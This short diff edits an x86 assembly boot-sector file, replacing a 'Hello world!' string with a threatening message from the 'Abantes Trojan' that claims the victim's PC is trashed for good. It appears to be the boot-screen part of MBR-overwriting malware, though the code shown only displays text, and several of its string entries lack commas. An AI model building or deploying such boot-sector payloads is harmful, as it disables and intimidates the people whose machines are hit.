@@ -40,6 +40,6 @@ clear_screen:
         int 0x10
         ret
    
-msg:            db        "Hello",13,10,"world!", 0
+msg:            db        "NEXT TIME READ THE RULES",13,10," ",13,10,"It Looks Like You Didn't Follow The Rules",13,10,"Now Your PC Has Been Trashed My The Abantes Trojan",13,10,"You're PC Will Never Work Again",13,10" ",13,10" ",13,10" ",13,10"NOTE:",13,10"Even If You Fix The MBR Your PC Is Still Dead", 0
 times 510 - ($-$$) db 0
 dw        0xaa55
